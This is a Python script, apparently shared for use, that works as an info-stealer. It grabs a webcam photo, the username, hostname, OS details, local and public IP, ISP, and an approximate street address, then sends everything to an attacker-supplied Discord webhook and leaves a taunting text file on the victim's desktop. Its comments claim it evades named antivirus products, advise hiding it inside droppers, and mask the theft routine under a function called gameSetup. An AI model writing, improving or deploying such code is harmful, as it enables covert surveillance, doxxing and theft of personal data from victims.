import cv2
import requests
import platform
import os
import subprocess
import socket

# CREATED BY BARISSO

# This file allows you to get the targets info. (maybe even personal if the person put any of their real info in their PC)
# After the info gets grabbed, it will sent to the target webhook url (Programmed to work with discord)
# You will see the Webcam Capture of the user, Their PC Username, Normal Username, Os INFO, 
# Local and Public IP (Could be Dangerous if the person is using a static IP)
# Country & City and Their Internet Service
# Simple data (Cant get hidden and encrypted data, Most of the time it just gets the username)
# And Their Full Address (Mostly its not going to be exact)

# This will repeat anytime this file gets opened. Its pretty easy to hide and execute it from another program (Like Droppers)
# This will not harm your PC. Its only one time but still dangerous.
# It cant get detected by big antiviruses like: Windows Defender, Bitdefender, Eset, Avast, Malwarebytes, AVG etc.
# IT cant get detected because it uses Simple Tasks.(Most of the time victims PC allows these)
# The only noticeable problem is at the first execution it can want access to their camera. it mostly depends on the victims PC
# But dont forget the risk that it can get detected at any time.
# USE AT YOUR OWN RISK

webhook_url = "Your Webhook Url Here"

# Message Settings. You can notify the person who opened this file with your text. The text will be saved on their desktop as "message.txt"
# And Automatically open when the info got grabbed and sent to the webhook.

# If you want to leave a message than set LeaveMessage = True
# Otherwise set it to False.

LeaveMessage = True
Message = """Your info got grabbed lol"""

# Open webcam
cam = cv2.VideoCapture(0)
ret, frame = cam.read()

def leaveMessageFunc(filename="message.txt", text=Message):
    desktop = os.path.join(os.path.expanduser("~"), "Desktop")
    
    file_path = os.path.join(desktop, filename)
    
    with open(file_path, "w", encoding="utf-8") as f:
        f.write(text)

    subprocess.Popen(["notepad.exe", file_path])


def gameSetup():
    success, buffer = cv2.imencode(".png", frame)

    if success:
        username = os.getlogin()
        response = requests.post(
            webhook_url,
            json={"content": f"Ooppss! It looks like **{username}** just got grabbed :rofl:"}
        )
        requests.post(
            webhook_url,
            files={"file": ("webcam.png", buffer.tobytes(), "image/png")}
        )

        pc_name = socket.gethostname()
        os_info = platform.system() + " " + platform.release()

        # Local IP
        local_ip = socket.gethostbyname(pc_name)

        ip_data = requests.get("http://ip-api.com/json/").json()

        lat = ip_data["lat"]
        lon = ip_data["lon"]

        # Get Address
        url = f"https://nominatim.openstreetmap.org/reverse?lat={lat}&lon={lon}&format=json"

        headers = {
            "User-Agent": "python-app"
        }

        address_data = requests.get(url, headers=headers).json()

        # Public IP
        public_ip = requests.get("https://api.ipify.org").text

        # Location info
        geo = requests.get(f"http://ip-api.com/json/{public_ip}").json()

        country = geo.get("country")    
        city = geo.get("city")
        isp = geo.get("isp")

        data = {f"User: **{username}**"}

        response = requests.post(
            webhook_url,
            json={"content": f"User: **{username}** :person_pouting:"}
        )

        response = requests.post(
            webhook_url,
            json={"content": f"Host Name: **{pc_name}** :notepad_spiral:"}
        )

        response = requests.post(
            webhook_url,
            json={"content": f"OS Info: **{os_info}** :desktop:"}
        )

        response = requests.post(
            webhook_url,
            json={"content": f"Local IP: **{local_ip}** :pushpin:"}
        )

        response = requests.post(
            webhook_url,
            json={"content": f"Public IP: **{public_ip}** :pushpin:"}
        )

        response = requests.post(
            webhook_url,
            json={"content": f"Country & City: **{country}**, **{city}**, Internet: **{isp}** :map:"}
        )

        response = requests.post(
            webhook_url,
            json={"content": f"Grabbed Data: **{data}** :scroll:"}
        )

        address = address_data["display_name"]

        response = requests.post(
            webhook_url,
            json={"content": f"Full Adress: **{address}** :dart:"}
        )

if ret:
    gameSetup()
    if LeaveMessage == True:
        leaveMessageFunc()

cam.release()   